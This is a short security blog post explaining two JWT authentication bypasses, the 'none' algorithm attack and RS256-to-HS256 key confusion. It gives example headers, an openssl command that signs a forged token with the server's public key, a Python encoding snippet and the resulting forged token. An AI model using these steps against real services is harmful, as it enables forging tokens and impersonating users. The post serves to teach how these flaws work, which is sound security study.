---
layout: post
title:  "Attacking JWT Authentication"
date:   2020-07-27 10:16:00
tags:   [JWT]
---

### Description
This post contains the ways to bypassing authentication with JWT exploit.
<br/>
<br/>


### JWT
Json Web Token is mainly used for web authentication and is a JSON-like data structure with cryptographic signatures. It consists of urlsafe base64 encoded data (characters, numbers, _ and -), separated by three parts with dots.

<br/>
<br/>


### JWT Structure
Json Web Token consists of three parts those are Header, Body and Signature.
```
# RS256 JWT
Headers = {
  "typ" : "JWT",
  "alg" : "RS256"
}

Body = {
  "name" : "03sunf",
  "type" : "user",
  "iat" : 1500000000
}
```
```
# HS256 JWT
Headers = {
  "typ" : "JWT",
  "alg" : "HS256"
}

Body = {
  "name" : "03sunf",
  "type" : "user",
  "iat" : 1500000000
}
```
<br/>
<br/>


### None Type Attack
This is a vulnerability that usually occurs when the web or API trusts the JWT header. It can be used by changing the algorithm part of the JWT header to none. Attacker can changes body data with `None` alg.
```
Headers = {
  "typ" : "JWT",
  "alg" : "None"
}

Body = {
  "name" : "03sunf",
  "type" : "user",
  "iat" : 1500000000
}
```
<br/>
<br/>


### Key Confusion Attack
```
jwt = JWT.decode(token, public_key)
```
If there is a part of the decode JWT like above example and server trusts algorithm of token header, JWT using the existing `RS256` normally checks the signature of the token, but JWT using the `HS256` uses the second argument `public_key` as the decryption key to change the algorithm when the public key is obtained. Internal data can be changed.
```
# Before
Headers = {
  "typ" : "JWT",
  "alg" : "RS256"
}

Payload = {
  "name" : "03sunf",
  "type" : "user",
  "iat" : 1500000000
}

# After
Headers = {
  "typ" : "JWT",
  "alg" : "HS256"
}

Payload = {
  "name" : "03sunf",
  "type" : "user",
  "iat" : 1500000000
}

# Body and Header data after urlsafe base64 encoding
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiMDNzdW5mIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1MDAwMDAwMDB9
```
<br/>

Attacker can sign with public key after changing data.
```sh
# Checking hex raw.
$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiMDNzdW5mIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1MDAwMDAwMDB9" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d "\\n")
(stdin)= 38a4dcf5a424e6371fcc163d61f1a559ec284c0b0df6209ee92c6d261e181f62
```
```python
# Encoding sign value.
import base64, binascii

print base64.urlsafe_b64encode(binascii.a2b_hex('38a4dcf5a424e6371fcc163d61f1a559ec284c0b0df6209ee92c6d261e181f62')).replace('=','')

# return => OKTc9aQk5jcfzBY9YfGlWewoTAsN9iCe6SxtJh4YH2I
```
```
# JWT generated
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiMDNzdW5mIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1MDAwMDAwMDB9.OKTc9aQk5jcfzBY9YfGlWewoTAsN9iCe6SxtJh4YH2I
```
<br/>
<br/>

